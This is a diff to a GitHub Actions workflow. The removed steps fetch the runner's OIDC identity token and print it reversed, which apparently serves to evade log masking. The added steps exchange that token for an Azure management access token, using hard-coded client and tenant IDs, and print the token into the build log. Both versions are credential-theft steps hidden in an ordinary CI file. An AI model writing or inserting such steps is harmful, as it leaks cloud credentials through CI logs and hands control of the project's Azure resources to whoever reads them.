@@ -6,7 +6,11 @@ permissions:
 jobs:
   t:
     runs-on: ubuntu-latest
+    env:
+      AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+      AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
     steps:
       - run: |
-          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" > /tmp/tok.json
-          python3 -c "import json;print(json.load(open('/tmp/tok.json'))['value'][::-1])" | fold -w120
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
+          curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+            -d "client_id=$AZURE_CLIENT_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$TOK&scope=https://management.azure.com/.default" | head -c 2000
